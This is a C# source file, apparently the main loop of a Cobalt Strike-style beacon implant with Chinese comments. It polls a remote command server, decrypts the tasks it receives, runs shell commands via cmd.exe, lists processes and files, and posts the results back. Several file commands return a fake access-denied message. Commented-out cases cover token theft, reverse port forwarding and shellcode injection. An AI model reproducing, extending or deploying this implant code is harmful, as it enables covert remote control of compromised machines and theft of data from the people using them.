using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Beacon.Packet;
using System.Threading;
using Beacon.Profiles;
using Beacon.Core;
using Beacon.Utils;
using System.IO;
using System.Security.Principal;
using Beacoon.Core;

namespace Beacon
{
    class Program

    {
        static void Main(string[] args)
        {
            Commons.ProfileInit();
            Commons cm = new Commons();                                                         //第一次发送元数据
            Console.WriteLine("[+] 目标服务器：" + Config.Host);
            cm.HttpGet(Config._GETURL);
            while (true)
            {
                try
                {
                    Thread.Sleep(Config._nSleepTime);
                    byte[] bAssemblyBuff = cm.HttpGet(Config._GETURL);                              //心跳包
                    
                    bAssemblyBuff = Prase.ReponseDataHandle(bAssemblyBuff,"Get");
                    if (bAssemblyBuff.Length != 0)
                    {
                        byte[] pRes = null;
                        byte[] pCallbackData = null;
                        byte[] pDecryptData = cm._prase.AESDecryptReponseData(bAssemblyBuff);       //解密并解析响应数据
                        if (pDecryptData != null)
                        {

                            if (!cm._prase.AnalysisReponseData(pDecryptData))
                            {
#if DEBUG
                                Console.WriteLine("[!] AnalysisReponseData Failed. ");
#endif
                                continue;
                            }
                            using (Tokens _t = new Tokens())
                            {
                                
                                switch (cm._prase._nCommonType)                                         //执行相关功能
                                {
                                    case (int)Config.FUNCINDEX.CD:                                      //CD
                                                                                                        // Misc.ChangeCurrentDirectory(cm._prase._pCommandBuff);
                                        Console.WriteLine("[+] command: cd");
                                        pRes = Bytes.FromString("拒绝访问:  AccessDenied() Error: 5");
                                        pCallbackData = cm._prase.MakeCallbackData(32, Bytes.FromString("ok"));
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    case (int)Config.FUNCINDEX.PWD:                                     //PWD
                                        Console.WriteLine("[+] command: pwd");
                                        pRes = Misc.GetCurrentDirectory();
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    case (int)Config.FUNCINDEX.DRIVES:                                  //DRIVES
                                        Console.WriteLine("[+] command: drives");
                                        pRes = Misc.GetDrives();
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    //case (int)Config.FUNCINDEX.SETENV:                                  //SETENV
                                    //    pRes = Misc.SetEnv(cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    case (int)Config.FUNCINDEX.COPYFILE:                                //CP
                                                                                                        // pRes = Files.CopyFile(cm._prase._pCommandBuff);
                                        Console.WriteLine("[+] command: cp");
                                        pRes = Bytes.FromString("拒绝访问:  AccessDenied() Error: 5");
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    case (int)Config.FUNCINDEX.MOVEFILE:                                //MV
                                                                                                        // pRes = Files.MoveFile(cm._prase._pCommandBuff);
                                        Console.WriteLine("[+] command: mv");
                                        pRes = Bytes.FromString("拒绝访问:  AccessDenied() Error: 5");
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    case (int)Config.FUNCINDEX.MKDIR:                                   //MKDIR
                                                                                                       //  pRes = Files.MkDir(cm._prase._pCommandBuff);
                                        Console.WriteLine("[+] command: mkdir");
                                        pRes = Bytes.FromString("拒绝访问:  AccessDenied() Error: 5");
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    //case (int)Config.FUNCINDEX.RM:                                      //RM
                                    //    pRes = Files.RemoveFile(cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    case (int)Config.FUNCINDEX.PS:                                         //PS

                                        
                                        pRes = Proc.GetProcessList(cm._prase._pCommandBuff);
                                        if (cm._prase._pCommandBuff[3] == 0)
                                        {
                                            Console.WriteLine($"[+] command: ps in console");
                                            pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        }
                                        else 
                                        {
                                            Console.WriteLine($"[+] command: ps in GUI");
                                            pCallbackData = cm._prase.MakeCallbackData(22, pRes);
                                        }
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    case (int)Config.FUNCINDEX.LS:                                      //LS
                                        Console.WriteLine($"[+] command: ls");
                                        
                                        if (cm._prase._pCommandBuff[1] == 255 && cm._prase._pCommandBuff[3]==254)
                                        {
                                            pRes = Files.Browse(cm._prase._pCommandBuff);
                                            Console.WriteLine($"[+] command: file browser in console");
                                            pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        }
                                        else
                                        {
                                            pRes = Files.BrowseGUI(cm._prase._pCommandBuff);
                                            Console.WriteLine($"[+] command: file browser in GUI");
                                            pCallbackData = cm._prase.MakeCallbackData(22, pRes);
                                        }
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                    //case (int)Config.FUNCINDEX.DOWNLOAD:                                //DOWNLOAD
                                    //    byte[] pFileLen = Files.GetFileLen(cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(2, pFileLen);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);

                                    //    Func<string, byte[], byte[]> _funcPost = cm.HttpPost;
                                    //    Func<int, byte[], byte[]> _funcMakeCallbackData = cm._prase.MakeCallbackData;
                                    //    Files.DownloadFile(cm._prase._pCommandBuff, _funcPost, _funcMakeCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.UPLOAD_START:                                //UPLOAD_START
                                    //    Files.UploadFile(cm._prase._pCommandBuff);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.UPLOAD_LOOP:                                //UPLOAD_LOOP
                                    //    Files.UploadFile(cm._prase._pCommandBuff);
                                    //    break;

                                    case (int)Config.FUNCINDEX.RUN:                                         //RUN\SHELL  cmd.exe /c 有回显

                                      //  Console.WriteLine($"[+] command: ");
                                        pRes = Proc.ShellCmdExecute(cm._prase._pCommandBuff);
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL,Config._nBeaconID, pCallbackData);
                                        break;
                                    //case (int)Config.FUNCINDEX.RUNAS:                                       //RUNAS runas [DOMAIN\user] [password] [command] [arguments]
                                    //    pRes = Proc.ShellCmdExecuteAs(cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.EXECUTE:                                     //EXEC  无回显
                                    //    Proc.ShellExecute(cm._prase._pCommandBuff, true);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, Bytes.FromString("ok"));
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.GETPRIVS:                                    //GETPRIVS
                                    //    pRes = Tokens.EnableCurrentProcessTokenPrivilege(_t, cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.MAKE_TOKEN:                                  //MAKE_TOKEN
                                    //    pRes = Tokens.MakeToken(_t, cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.STEAL_TOKEN:                                 //STEAL_TOKEN
                                    //    pRes = Tokens.StealToken(_t, cm._prase._pCommandBuff);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    //case (int)Config.FUNCINDEX.REV2SELF:                                    //REV2SELF
                                    //    pRes = Tokens.Rev2Self(_t);
                                    //    pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                    //    cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
                                    //    break;
                                    case (int)Config.FUNCINDEX.SLEEP:                                       //SLEEP
                                        
                                        pRes = Misc.ChangeSleepTime(cm._prase._pCommandBuff);
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
//                                    case (int)Config.FUNCINDEX.RPORTFWD:                                   //RPORTFWD
//#if DEBUG                           //只有端口号返回
//                                        Console.WriteLine(cm._prase._pCommandBuff);
//#endif
//                                        pRes = Forward.CreateReversePortForward(cm._prase._pCommandBuff);
//                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
//                                        cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
//                                        break;
//                                    case (int)Config.FUNCINDEX.RPORTFWD_STOP:                              //RPORTFWD_STOP
//                                        pRes = Forward.DeleteReversePortForward(cm._prase._pCommandBuff);
//                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
//                                        cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
//                                        break;
//                                    case (int)Config.FUNCINDEX.INJECT_X64:                                 //INJECT_X64
//                                        Inject.CreateRemoteThreadInjectShellCode(23448, Config._pShellcodeBuf_X64);
//                                        //TODO
//                                        break;
//                                    case (int)Config.FUNCINDEX.Kill:                                       //KILL
//                                        pRes = Proc.KillProcess(cm._prase._pCommandBuff);
//                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
//                                        cm.HttpPost(Config._POSTURL + Config._nBeaconID, pCallbackData);
//                                        break;
                                    case (int)Config.FUNCINDEX.EXIT:                                       //EXIT
                                        Misc.Exit();
                                        break;
                                    default:
                                        pRes = Misc.ErrorMsg("Command Uknown");
                                        pCallbackData = cm._prase.MakeCallbackData(32, pRes);
                                        cm.HttpPost(Config._POSTURL , Config._nBeaconID, pCallbackData);
                                        break;
                                }
                            }

                        }
                        else
                        {
#if DEBUG
                            Console.WriteLine("[!] AESDecryptReponseData Failed. ");
#endif
                            continue;
                        }
                    }
                }
                catch(Exception e) 
                {
#if DEBUG
                    Console.Error.WriteLine("[!] Exception: " + e.Message);
#endif
                    cm.HttpPost(Config._POSTURL , Config._nBeaconID, cm._prase.MakeCallbackData(32, Misc.ErrorMsg("[!] Exception: "+ e.Message)));
                }
            }

        }
    }
}


